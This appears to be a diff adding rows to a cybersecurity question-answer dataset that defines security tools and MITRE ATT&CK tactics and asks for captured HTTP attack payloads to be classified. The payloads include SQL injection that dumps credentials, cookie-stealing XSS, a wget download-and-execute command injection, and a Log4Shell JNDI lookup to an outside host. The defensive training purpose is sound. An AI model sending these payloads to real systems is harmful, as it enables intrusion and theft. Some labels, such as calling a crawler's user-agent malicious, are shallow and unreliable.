@@ -4,6 +4,22 @@ What is Command Injection attack?,,a type of cyber attack where an attacker exec
 What is XSS (Cross Site Scripting) attack?,,"a type of cyber attack in which an attacker injects malicious code into a vulnerable web application, which is then executed by a victim's browser. The attack typically involves injecting script code into a web page or web application that is then executed when a user visits the page or interacts with the application."
 What is JNDI Injection attack?,,a type of security vulnerability that occurs when an attacker is able to inject malicious data into a Java Naming and Directory Interface (JNDI) lookup operation.
 What is Word Press vulnerability?,,a weakness in the WordPress core software or in one of the many third-party plugins or themes that are commonly used with WordPress.
+What is malicious user-agent?,,a type of user-agent string that is used by attackers or malicious software to disguise their identity and bypass security controls.
+What is attempts to access the admin page attack?,,a type of attack where an adversary attempts to access the administrative or management interface of a web application or network device by guessing or brute-forcing the correct login credentials.
+What is FW?,FW is Firewall.,"a network security device that monitors and controls incoming and outgoing network traffic based on predefined security rules. A firewall acts as a barrier between a trusted internal network and an untrusted external network, such as the internet, and helps prevent unauthorized access to the internal network by blocking or filtering traffic that does not meet certain criteria."
+What is IPS?,IPS is Intrusion Prevention System.,"a network security device that monitors network traffic for signs of malicious activity and can take actions to prevent or stop such activity. An IPS works by inspecting network packets and comparing them to known patterns of malicious traffic, such as known signatures of viruses, malware, or attacks."
+What is IDS?,IDS is Intrusion Detection System.,"a network security device or software application that monitors network traffic for signs of malicious activity. An IDS works by inspecting network packets and comparing them to known patterns of malicious traffic, such as known signatures of viruses, malware, or attacks."
+What is EDR?,EDR is Endpoint Detection and Response.," a type of security technology that is designed to detect and respond to advanced threats on endpoint devices, such as desktops, laptops, servers, and mobile devices. EDR solutions typically use advanced techniques such as behavioral analysis, machine learning, and threat intelligence to detect and respond to threats that may have evaded other security measures."
+What is WAF?,WAF is Web Application Firewall.,"a type of firewall designed specifically to protect web applications from attacks. WAFs sit between the web application and the internet, inspecting and filtering incoming and outgoing web traffic to block attacks and vulnerabilities."
+What is WEB?,"WEB, short for World Wide Web.","a system of interconnected documents and resources, accessed through the internet, that are linked together through hyperlinks and URLs (Uniform Resource Locators). The World Wide Web was invented by Sir Tim Berners-Lee in 1989, and has since become an integral part of modern society, with billions of users accessing web-based resources every day."
+What is APACHE WEB?,,"Apache Web Server, often referred to simply as ""Apache,"" is an open-source web server software that is used to host and serve web content over the internet. Apache is one of the most widely used web servers in the world and is known for its reliability, flexibility, and security."
+What is NGINX WEB?,,"NGINX (pronounced ""engine-x"") is an open-source web server software that is used to host and serve web content over the internet. NGINX is known for its high performance, reliability, and scalability, and is widely used by organizations of all sizes to serve web content and manage web traffic."
+What is IIS WEB?,,"IIS (Internet Information Services) is a web server software developed by Microsoft and is used to host and serve web content over the internet. IIS is specifically designed to work with Windows operating systems, and is included with most versions of Windows."
+What is CVE?,CVE is Common Vulnerabilities and Exposures.,a system used to identify and track publicly known cybersecurity vulnerabilities and exposures in software and hardware products.
+What is Sigma Rule?,,"a flexible and open-source format for describing detection rules used in security information and event management (SIEM) systems, intrusion detection systems (IDS), and other security tools. Sigma rules are designed to be simple, portable, and easy to write, modify, and share."
+What is Snort Rule?,,Snort is a widely used open-source intrusion detection and prevention system that can analyze network traffic in real-time to detect and prevent malicious activity. A Snort rule is a text-based rule that describes the conditions for detecting specific types of traffic or activity on a network.
+What is YARA Rule?,,YARA is an open-source tool designed to help malware researchers and security professionals identify and classify malware samples based on patterns and rules. YARA rules are text-based and describe patterns or characteristics that can be used to identify a specific type of file or code.
+What is Mitre Att&ck matrix?,,a globally accessible knowledge base of adversary tactics and techniques that are used during cyberattacks. It is a comprehensive model of real-world attack techniques used by adversaries to compromise and exfiltrate sensitive information from targeted systems.
 How many enterprise Tactics IDs are in the Mitre Att&ck v13 matrix released in April 2023?,"The Mitre Att&ck v13, announced in April 2023, consists of a total of 14 Enterprise Tactics IDs, including TA0001 (Initial Access), TA0002 (Execution), TA0003 (Persistence), TA0004 (Privilege Escalation), TA0005 (Defense Evasion), TA0006 (Credential Access), TA0007 (Discovery), TA0008 (Lateral Movement), TA0009 (Collection), TA0010 (Exfiltration), TA0011 (Command and Control), TA0040 (Impact), TA0042 (Resource Development), and TA0043 (Reconnaissance).",The Mitre Att&ck v13 matrix released in April 2023 has a total of 14 Enterprise Tactics IDs.
 What is TA0043 (Reconnaissance)?,,The adversary is trying to gather information they can use to plan future operations.
 What is TA0042 (Resource Development)?,,The adversary is trying to establish resources they can use to support operations.
@@ -19,3 +35,48 @@ What is TA0009 (Collection)?,,The adversary is trying to gather data of interest
 What is TA0011 (Command and Control)?,,The adversary is trying to communicate with compromised systems to control them.
 What is TA0010 (Exfiltration)?,,The adversary is trying to steal data.
 What is TA0040 (Impact)?,,"The adversary is trying to manipulate, interrupt, or destroy your systems and data."
+Explain the following payload.,"Payload is GET /jenkins/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+Host: www.test.go.kr
+Connection: Keep-Alive
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None).","Since the input payload has union~all~select~from phrase, it is a type of SQL Injection attack."
+Explain the following payload.,"Payload is GET /themes/mambosimple.php?detection=detected&sitename=</title><script src=http://www.test.go.kr/xss.js>alert(document.cookie)</script> HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Host: 10.0.0.100
+User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)
+Connection: Keep-Alive.","Since the entered payload has the script~alert phrase, it is a type of XSS (Cross Site Scripting) attack."
+Explain the following payload.,"Payload is GET /shell?cd+/tmp;rm+-rf+am7;wget+http:/\/10.10.123.123/uc/am7;chmod+777+am7;./am7+jaws;rm+-rf+arm7 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9.","The input payload is a Command Injection attack type because the phrases cd~tmp, rm~-rf, and wget~ttp are in front of http_version (HTTP/1.1)."
+Explain the following payload.,"Payload is GET /struts/utils.js HTTP/1.1
+Host: 10.10.123.123
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15
+X-Client-Ip: ${jndi:ldap://www.test.go.kr:8080/w3ekt2ozxslheku5ln9vv/${sys:java.vendor}_${sys:java.version}}.","Since the input payload has the phrase jndi~ldap, it is a type of JNDI Injection attack."
+Explain the following payload.,"Payload is GET /phpMyAdmin//iisadminpwd/achg.htr
+/scripts/setup.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/172.16.1.12 Safari/537.36Host: 10.10.123.123 Connection: Keep-AliveCache-Control: no-cache.","The entered payload has a phrase that accesses phpmyadmin's setup.php, so it is an attack type that attempts to access the admin page."
+Explain the following payload.,"Payload is GET /robots.txt HTTP/1.1
+rw-request-time: 1574036860318
+cdn-ip: 10.10.123.123
+referer: http://admin.corea.school
+x-forwarded-for: 10.10.123.123
+connection: close
+x-via: 1.1 PSzjhzdx5zr114:1 (Cdn Cache Server V2.0), 1.1 PSjsczBGPhq236:5 (Cdn Cache Server V2.0)
+accept-encoding: gzip
+user-agent: Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://test.go.kr/bot.html)
+accept: */*
+x-ws-request-id: 5dd1e57c_PSzjhzdx5rc115_15610-58289
+x-cdn-src-port: 33312
+cdn-src-ip: 10.10.123.123
+host: admin.corea.school.",The input payload is of type malicious user-agent since the user-agent is semrushbot.
+Explain the following payload.,"Payload is GET /wp-login.php?redirect_to=http%3A%2F%2Fwww.corea.school%2Fwp-config%2F&reauth=1 HTTP/1.1
+Accept: text/html application/xhtml+xml image/jxr */*
+Referer: http://10.10.123.123:3100/board/portal/mainSkin01.jsp
+Accept-Language: ko-KR  User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko  Accept-Encoding: gzip deflate
+Host: owa.corea.school
+Connection: Keep-Alive  Cookie: PHPSESSID=l3umb8a20lkiu53tr2s0bm9kb3.","Since the input payload accesses /wp-login.php, it is a type of Word Press vulnerability attack."
